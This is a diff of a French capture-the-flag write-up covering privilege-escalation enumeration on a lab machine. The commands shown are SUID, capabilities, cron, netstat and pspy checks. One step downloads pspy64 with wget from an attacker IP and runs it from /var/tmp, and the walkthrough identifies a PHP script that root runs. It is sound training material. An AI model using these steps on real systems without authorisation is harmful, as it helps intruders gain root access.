@@ -731,64 +731,150 @@ root:x:0:0:root:/root:/bin/bash
 {{< escalade-intro user="ssh_user" >}}
 
 ### Sudo -l
-Tu commences toujours par vérifier les droits sudo :
+**Résultat**
+
+```bash
+Sorry, user albert may not run sudo on alert.
+```
+
+L’utilisateur `albert` ne peut exécuter aucune commande en tant que root via sudo.
+
+------
 
 ### Recherche de binaires SUID
-Tu poursuis l’énumération en recherchant les **binaires SUID**, qui permettent parfois d’exécuter certaines commandes avec les privilèges de leur propriétaire.
+
+Tu poursuis l’énumération en recherchant les binaires SUID, qui permettent parfois d’exécuter des commandes avec les privilèges de leur propriétaire.
 
 ```bash
 find / -perm -4000 -type f 2>/dev/null
 ```
 
-La liste obtenue ne contient que des binaires système classiques tels que :
+**Résultat (extrait)**
 
-```texte
-/usr/bin/passwd
-/usr/bin/chsh
+```bash
+/opt/google/chrome/chrome-sandbox
 /usr/bin/chfn
-/usr/bin/sudo
+/usr/bin/mount
+/usr/bin/su
 /usr/bin/newgrp
+/usr/bin/sudo
+/usr/bin/gpasswd
+/usr/bin/fusermount
+/usr/bin/passwd
+/usr/bin/umount
+/usr/bin/at
+/usr/bin/chsh
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
 ```
 
-Tu n’identifies aucun binaire inhabituel ou directement exploitable.
+Il s’agit uniquement de binaires système classiques, sans piste d’exploitation directe.
+
+------
 
 ### Analyse des Linux capabilities
 
-Tu vérifies ensuite si certains binaires disposent de **capabilities Linux**, qui permettent à un programme d’effectuer certaines actions privilégiées sans être exécuté en root ou via un binaire SUID.
-
-La vérification se fait avec la commande suivante :
+Tu vérifies ensuite les capabilities Linux, qui permettent à certains binaires d’effectuer des actions privilégiées sans être root.
 
 ```bash
 getcap -r / 2>/dev/null
 ```
 
-Ici, tu ne trouves aucune capability inhabituelle ni aucun binaire exploitable.
+**Résultat**
+
+```bash
+/usr/bin/traceroute6.iputils = cap_net_raw+ep
+/usr/bin/mtr-packet = cap_net_raw+ep
+/usr/bin/ping = cap_net_raw+ep
+/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
+```
+
+👉 Aucune capability exploitable dans ce contexte.
+
+------
 
 ### Inspection des tâches cron
-Tu vérifies ensuite les **tâches planifiées (cron)**, car certains scripts exécutés automatiquement par le système peuvent être modifiables par un utilisateur et permettre une élévation de privilèges.
 
-Les crons système peuvent être consultés avec :
+Tu vérifies ensuite les tâches planifiées :
 
 ```bash
 cat /etc/crontab
 ```
 
-### Analyse des services locaux
-Tu vérifies ensuite les **services en cours d’exécution**, ce qui permet parfois d’identifier une application vulnérable ou un service mal configuré.
+**Résultat**
 
+```bash
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
 ```
+
+👉 Rien d’anormal ici, uniquement des tâches système classiques.
+
+------
+
+### Analyse des services locaux
+
+Tu identifies ensuite les services en écoute :
+
+```bash
 netstat -tulpn
 ```
 
+**Résultat (extrait)**
+
+```bash
+tcp        0      0 127.0.0.1:8080          LISTEN
+tcp        0      0 0.0.0.0:22              LISTEN
+tcp6       0      0 :::80                   LISTEN
+```
+
+👉 Un service est accessible uniquement en local sur le port `127.0.0.1:8080`, ce qui peut être intéressant mais ne constitue pas une piste immédiate.
+
+------
+
 ### pspy64
-Tu lances également pspy64 dans une deuxième session SSH afin d’observer en temps réel les processus exécutés sur la machine, notamment ceux lancés par root.
 
-cd /tmp
+Tu lances également `pspy64` dans une deuxième session SSH afin d’observer en temps réel les processus exécutés sur la machine, notamment ceux lancés par root.
+
+> **Note**
+>  Comme tu le constates rapidement, les répertoires `/tmp` et `/dev/shm` sont nettoyés régulièrement sur cette machine.
+>  Tu utilises donc `/var/tmp`, accessible en lecture et en écriture par l’utilisateur `albert`, car il permet de conserver les fichiers plus longtemps.
+
+Tu le télécharges et l’exécutes depuis un répertoire persistant (`/var/tmp`) :
+
+```bash
+cd /var/tmp
+wget http://10.10.16.93:8000/pspy64
+chmod +x pspy64
 ./pspy64
+```
 
-L’objectif est de repérer d’éventuelles tâches cron, scripts ou commandes exécutés automatiquement par root et qui pourraient être exploitables pour une escalade de privilèges.
+Très rapidement, une activité attire ton attention :
 
-Dans ce cas précis, aucun processus exploitable n’apparaît dans cette deuxième session, même en redémarrant la première session SSH.
+```bash
+CMD: UID=0 | /usr/bin/php -f /opt/website-monitor/monitor.php
+```
+
+Ce script est exécuté automatiquement par root.
+
+Tu observes également la présence du service cron :
+
+```bash
+CMD: UID=0 | /usr/sbin/CRON -f
+```
+
+Concrètement, cela signifie qu’un script PHP situé dans `/opt/website-monitor/` est lancé régulièrement avec les privilèges root.
+
+C’est exactement le type de comportement que tu recherches pour une escalade de privilèges :
+
+> un script exécuté par root que tu peux potentiellement influencer
+
+Cette découverte oriente directement la suite de l’analyse vers le contenu de `/opt/website-monitor/`.
+
 ### Conclusion de l’énumération manuelle
 
 ### Analyse avec linpeas.sh
